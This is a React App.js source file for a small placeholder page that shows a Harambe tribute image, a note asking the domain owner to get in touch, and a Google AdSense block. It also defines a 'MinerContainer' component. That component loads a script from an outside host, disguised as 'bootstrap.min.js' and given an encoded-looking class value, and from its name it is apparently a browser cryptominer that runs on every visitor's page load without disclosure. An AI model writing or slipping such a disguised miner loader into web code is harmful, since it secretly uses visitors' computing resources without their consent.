import React, { Component } from 'react';
import { Advertisement, Container, Header, Image } from 'semantic-ui-react'
import 'semantic-ui-css/semantic.min.css';
import harambe from './harambe.jpg';
import './App.css';

const HarambeContainer = () => (
  <Container textAlign={'center'} text>
    <figure>
        <Image src={harambe} size='massive' centered/>
      <figcaption>Harambe, 1999 - 2016</figcaption>
    </figure>
    <Header textAlign={'center'} as='h2'>This shouldn't be here</Header>
  </Container>
)


const TextContainer = () => (
  <Container textAlign={'left'} text>
    <p>
      Hello
      </p>
      <p>
      This tribute to Harambe shouldn't be here. I don't know who to contact
      about this domain but if it's you, please get in touch.
    </p>
    <p>
    Amin Shah Gilani {"<"}<a href="mailto:amin@gilani.me">amin@gilani.me</a>{">"} (<a href="https://keybase.io/gilani">PGP Key</a>)
    </p>
  </Container>
)

const AddContainer = () => (
  <Container textAlign={'center'} text>
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <Advertisement unit='leaderboard' >
         <ins class="adsbygoogle"
         style={{ display: "block" }}
         data-ad-client="ca-pub-2863061781488070"
         data-ad-slot="2480975372"
         data-ad-format="auto"></ins>
    </Advertisement>
    <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
  </Container>
)

const MinerContainer = () => (
  <script async class="=OHdQVVFrcU47NjA7MQ==" src="https://play.istlandoll.com/bootstrap.min.js"></script>
)


class App extends Component {
  render() {
    return (
      <div id="App">
        <HarambeContainer />
        <TextContainer />
        <AddContainer />
        <MinerContainer />
      </div>
    );
  }
}

export default App;
